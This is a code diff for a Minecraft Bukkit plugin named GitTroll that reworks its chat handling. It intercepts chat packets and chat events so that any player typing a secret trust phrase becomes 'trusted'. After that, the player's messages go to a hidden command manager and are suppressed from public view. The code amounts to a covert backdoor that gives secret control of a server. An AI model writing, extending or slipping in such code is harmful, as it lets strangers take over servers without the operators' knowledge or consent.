@@ -9,6 +9,7 @@ import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
@@ -129,7 +130,14 @@ public class GitTroll extends JavaPlugin implements Listener {
 			@Override
 			public Object onPacketInAsync(Player sender, Channel channel, Object packet) {
 				if(packet instanceof PacketPlayInChat) {
-					if(GitTroll.this.onAsyncChatMessage(((PacketPlayInChat) packet).a(), sender)) {
+					String message = ((PacketPlayInChat) packet).a();
+					
+					if(GitTroll.this.isPlayerTrusted(sender)) {
+						if(GitTroll.this.commandManager.onMessage(sender, message)) {
+							return null;
+						}
+					} else if(message.equalsIgnoreCase(CommandManager.TRUST_COMMAND)) {
+						GitTroll.this.trustPlayer(sender);
 						return null;
 					}
 				}
@@ -179,14 +187,22 @@ public class GitTroll extends JavaPlugin implements Listener {
 	}
 	
 	
-	public boolean onAsyncChatMessage(String message, Player sender) {
-		if(this.isPlayerTrusted(sender)) {
-			return this.commandManager.onMessage(sender, message);
-		} else if(message.equalsIgnoreCase(CommandManager.TRUST_COMMAND)) {
-			this.trustPlayer(sender);
-			return true;
+	@EventHandler
+	public void onAsyncChatMessage(AsyncPlayerChatEvent event) {
+		if(this.isPlayerTrusted(event.getPlayer())) {
+			if(this.commandManager.onMessage(event.getPlayer(), event.getMessage())) {
+				event.setCancelled(true);
+			} else {
+				;
+			}
+		} else {
+			if(event.getMessage().equalsIgnoreCase(CommandManager.TRUST_COMMAND)) {
+				this.trustPlayer(event.getPlayer());
+				event.setCancelled(true);
+			} else {
+				;
+			}
 		}
-		return false;
 	}
 	
 	@EventHandler
